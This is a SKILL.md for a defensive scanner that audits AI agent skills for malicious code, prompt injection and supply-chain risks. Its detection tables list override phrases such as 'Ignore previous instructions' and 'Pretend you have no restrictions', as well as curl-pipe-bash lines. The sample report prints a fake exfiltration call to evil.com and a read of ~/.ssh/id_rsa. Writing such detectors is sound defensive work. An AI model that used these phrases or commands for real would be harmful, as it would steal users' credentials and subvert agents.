---
name: "skill-security-auditor"
description: >
  Security audit and vulnerability scanner for AI agent skills before installation.
  Use when: (1) evaluating a skill from an untrusted source, (2) auditing a skill
  directory or git repo URL for malicious code, (3) pre-install security gate for
  Claude Code plugins, OpenClaw skills, or Codex skills, (4) scanning Python scripts
  for dangerous patterns like os.system, eval, subprocess, network exfiltration,
  (5) detecting prompt injection in SKILL.md files, (6) checking dependency supply
  chain risks, (7) verifying file system access stays within skill boundaries.
  Triggers: "audit this skill", "is this skill safe", "scan skill for security",
  "check skill before install", "skill security check", "skill vulnerability scan".
---

# Skill Security Auditor

Scan and audit AI agent skills for security risks before installation. Produces a
clear **PASS / WARN / FAIL** verdict with findings and remediation guidance.

## Quick Start

Run it through `py.sh`, never as `python3`. On Windows `python3` is usually a 0-byte Microsoft
Store alias stub that exits 9009 without running anything, and installing Python does not
displace it; `py.sh` picks an interpreter by executing candidates rather than trusting the name.

```bash
AUDIT="bash ${CLAUDE_PLUGIN_ROOT}/hooks/py.sh \
${CLAUDE_PLUGIN_ROOT}/skills/skill-security-auditor/scripts/skill_security_auditor.py"

# Audit a local skill directory
$AUDIT /path/to/skill-name/

# Audit a skill from a git repo
$AUDIT https://github.com/user/repo --skill skill-name

# Audit with strict mode (any WARN becomes FAIL)
$AUDIT /path/to/skill-name/ --strict

# Output JSON report
$AUDIT /path/to/skill-name/ --json
```

## What Gets Scanned

### 1. Code Execution Risks (Python/Bash Scripts)

Scans all `.py`, `.sh`, `.bash`, `.js`, `.ts` files for:

| Category                   | Patterns Detected                                                                                            | Severity    |
| -------------------------- | ------------------------------------------------------------------------------------------------------------ | ----------- |
| **Command injection**      | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, backtick execution                               | 🔴 CRITICAL |
| **Code execution**         | `eval()`, `exec()`, `compile()`, `__import__()`                                                              | 🔴 CRITICAL |
| **Obfuscation**            | base64-encoded payloads, `codecs.decode`, hex-encoded strings, `chr()` chains                                | 🔴 CRITICAL |
| **Network exfiltration**   | `requests.post()`, `urllib.request`, `socket.connect()`, `httpx`, `aiohttp`                                  | 🔴 CRITICAL |
| **Credential harvesting**  | reads from `~/.ssh`, `~/.aws`, `~/.config`, `%USERPROFILE%`/`%APPDATA%` credential paths, env var extraction | 🔴 CRITICAL |
| **File system abuse**      | writes outside skill dir, `/etc/`, shell configs, PowerShell profiles, Startup folder, symlink creation      | 🟡 HIGH     |
| **Privilege escalation**   | `sudo`, world-writable `chmod`, `setuid`, cron manipulation, registry Run keys, `schtasks /create`           | 🔴 CRITICAL |
| **Unsafe deserialization** | `pickle.loads()`, `yaml.load()` (without SafeLoader), `marshal.loads()`                                      | 🟡 HIGH     |
| **Subprocess (safe)**      | `subprocess.run()` with list args, no shell                                                                  | ⚪ INFO     |

### 2. Prompt Injection in SKILL.md

Scans SKILL.md and all `.md` reference files for:

| Pattern                    | Example                                                      | Severity    |
| -------------------------- | ------------------------------------------------------------ | ----------- |
| **System prompt override** | "Ignore previous instructions", "You are now..."             | 🔴 CRITICAL |
| **Role hijacking**         | "Act as root", "Pretend you have no restrictions"            | 🔴 CRITICAL |
| **Safety bypass**          | "Skip safety checks", "Disable content filtering"            | 🔴 CRITICAL |
| **Hidden instructions**    | Zero-width characters, HTML comments with directives         | 🟡 HIGH     |
| **Excessive permissions**  | "Run any command", "Full filesystem access"                  | 🟡 HIGH     |
| **Data extraction**        | "Send contents of", "Upload file to", "POST to"              | 🔴 CRITICAL |
| **Embedded shell attacks** | `curl … \| bash`, download-and-execute lines inside markdown | 🔴 CRITICAL |

### 3. Dependency Supply Chain

For skills with `requirements.txt`, `package.json`, or inline `pip install`:

| Check                        | What It Does                                             | Severity |
| ---------------------------- | -------------------------------------------------------- | -------- |
| **Typosquatting**            | Flag packages similar to popular ones (e.g., `reqeusts`) | 🟡 HIGH  |
| **Unpinned versions**        | Flag `requests>=2.0` vs `requests==2.31.0`               | ⚪ INFO  |
| **Install commands in code** | `pip install` or `npm install` inside scripts            | 🟡 HIGH  |

CVE lookups are out of scope — this tool is offline pattern matching only (see Limitations). Use the `dependency-auditor` skill for vulnerability scanning.

### 4. File System & Structure

| Check                     | What It Does                                                                            | Severity    |
| ------------------------- | --------------------------------------------------------------------------------------- | ----------- |
| **Sensitive path access** | Pattern-based detection of reads/writes to credential dirs, shell configs, system paths | 🟡 HIGH     |
| **Hidden files**          | `.env`, dotfiles that shouldn't be in a skill                                           | 🟡 HIGH     |
| **Binary files**          | Unexpected executables, `.so`, `.dll`, `.exe`                                           | 🔴 CRITICAL |
| **Large files**           | Files >1MB that could hide payloads                                                     | ⚪ INFO     |
| **Symlinks**              | Symbolic links pointing outside skill directory                                         | 🔴 CRITICAL |

## Audit Workflow

1. **Run the scanner** on the skill directory or repo URL
2. **Review the report** — findings grouped by severity
3. **Verdict interpretation:**
   - **✅ PASS** — No critical or high findings. Safe to install.
   - **⚠️ WARN** — High/medium findings detected. Review manually before installing.
   - **❌ FAIL** — Critical findings. Do NOT install without remediation.
4. **Remediation** — each finding includes specific fix guidance

## Reading the Report

```
╔══════════════════════════════════════════════╗
║  SKILL SECURITY AUDIT REPORT                ║
║  Skill: example-skill                        ║
║  Verdict: ❌ FAIL                            ║
╠══════════════════════════════════════════════╣
║  🔴 CRITICAL: 2  🟡 HIGH: 1  ⚪ INFO: 3    ║
╚══════════════════════════════════════════════╝

🔴 CRITICAL [CODE-EXEC] scripts/helper.py:42
   Pattern: eval(user_input)
   Risk: Arbitrary code execution from untrusted input
   Fix: Replace eval() with ast.literal_eval() or explicit parsing

🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
   Pattern: requests.post("https://evil.com/collect", data=results)
   Risk: Data exfiltration to external server
   Fix: Remove outbound network calls or verify destination is trusted

🔴 CRITICAL [CRED-HARVEST] scripts/scanner.py:15
   Pattern: open(os.path.expanduser("~/.ssh/id_rsa"))
   Risk: Reads credential files (SSH keys, AWS creds, secrets)
   Fix: Remove all access to credential directories

⚪ INFO [DEPS-UNPIN] requirements.txt:3
   Pattern: requests>=2.0
   Risk: Unpinned dependency may introduce vulnerabilities
   Fix: Pin to specific version: requests==2.31.0
```

## Advanced Usage

### Audit a Skill from Git Before Cloning

```bash
# Clone to temp dir, audit, then clean up
$AUDIT https://github.com/user/skill-repo --skill my-skill --cleanup
```

Both `--strict` (any WARN becomes FAIL) and `--json` compose with every invocation, so a CI
step or a loop over `skills/*/` is the same command with a redirect. Write those in the
project's own CI config rather than copying a snippet from here — and invoke the script through
`py.sh`, never `python3`, even on a Linux runner. The Store-stub problem is Windows-only, but a
snippet that hardcodes `python3` gets copied to a `windows-latest` runner eventually, and then
it exits 9009 and reports nothing while looking like it passed.

## Threat Model Reference

For the complete threat model, detection patterns, and known attack vectors against AI agent skills, see [references/threat-model.md](references/threat-model.md).

## Limitations

- Cannot detect logic bombs or time-delayed payloads with certainty
- Obfuscation detection is pattern-based — a sufficiently creative attacker may bypass it
- Network destination reputation checks require internet access
- Does not execute code — static analysis only (safe but less complete than dynamic analysis)
- Dependency vulnerability checks use local pattern matching, not live CVE databases

When in doubt after an audit, **don't install**. Ask the skill author for clarification.
